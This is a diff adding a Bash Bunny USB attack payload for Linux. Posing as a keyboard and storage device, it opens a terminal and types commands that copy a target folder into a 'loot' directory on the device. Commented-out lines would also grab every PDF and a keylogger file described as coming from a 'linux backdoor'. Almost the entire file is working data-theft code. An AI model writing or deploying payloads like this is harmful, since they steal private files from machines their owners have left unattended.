@@ -1,0 +1,33 @@
+#!/bin/bash
+#
+# Grabs pdfs and other specified files from linux system 
+#
+#
+
+LED SETUP
+ATTACKMODE HID STORAGE
+
+LED ATTACK
+RUN UNITY gnome-terminal
+Q DELAY 1000 
+Q STRING export lootdir=/run/media/\$USER/BashBunny/loot/LinuxGrabber #export loot directory 
+Q ENTER
+Q STRING mkdir -p \$lootdir #make loot directory 
+Q ENTER
+# Find all PDFs stored in the user's file structure, and copy them over to the BashBunny storage.
+#Q STRING find . -name "*.pdf" -exec cp '{}' \$lootdir \\\;
+#Q ENTER 
+Q DELAY 1000
+# Find the folder to copy 
+Q STRING find . -type d -name 'testing' -exec cp -a '{}' \$lootdir \\\;
+Q ENTER 
+Q DELAY 1000 
+#Q STRING find . -name "key.log" -exec cp '{}' \$lootdir \\\; #searches the keylog file from linux backdoor
+#Q ENTER 
+Q STRING exit
+Q ENTER 
+
+# sync the filesystem
+sync
+
+LED FINISH 
